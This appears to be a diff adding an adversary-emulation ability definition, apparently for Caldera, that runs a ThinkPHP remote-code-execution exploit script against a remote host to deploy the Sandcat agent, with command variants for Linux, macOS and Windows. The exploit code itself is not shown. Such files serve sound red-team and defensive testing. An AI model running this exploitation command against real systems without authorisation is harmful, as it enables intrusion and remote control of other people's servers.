@@ -1,0 +1,45 @@
+---
+
+- id: e312ac69-48c3-4831-90df-d755efc59eab
+  name: Naive Exploit ThinkPHP -- remote host
+  description: Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server
+  tactic: Lateral-Movement
+  technique:
+    attack_id: T1210
+    name: Exploitation of Remote Services
+  platforms:
+    linux:
+      sh:
+        command: |
+          python3 thinkphp-exploit.py -i #{remote.host.ip} -s #{server}
+        payload: thinkphp-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.thinkphp_user
+          script: ''
+    darwin:
+      sh:
+        command: |
+          python3 thinkphp-exploit.py -i #{remote.host.ip} -s #{server}
+        payload: thinkphp-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.thinkphp_user
+          script: ''
+    windows:
+      psh:
+        command: |
+           python3 thinkphp-exploit.py -i #{remote.host.ip} -s #{server}
+        payload: thinkphp-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.thinkphp_user
+          script: ''
+      cmd:
+        command: |
+          python3 thinkphp-exploit.py -i #{remote.host.ip} -s #{server}
+        payload: thinkphp-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.thinkphp_user
+          script: ''
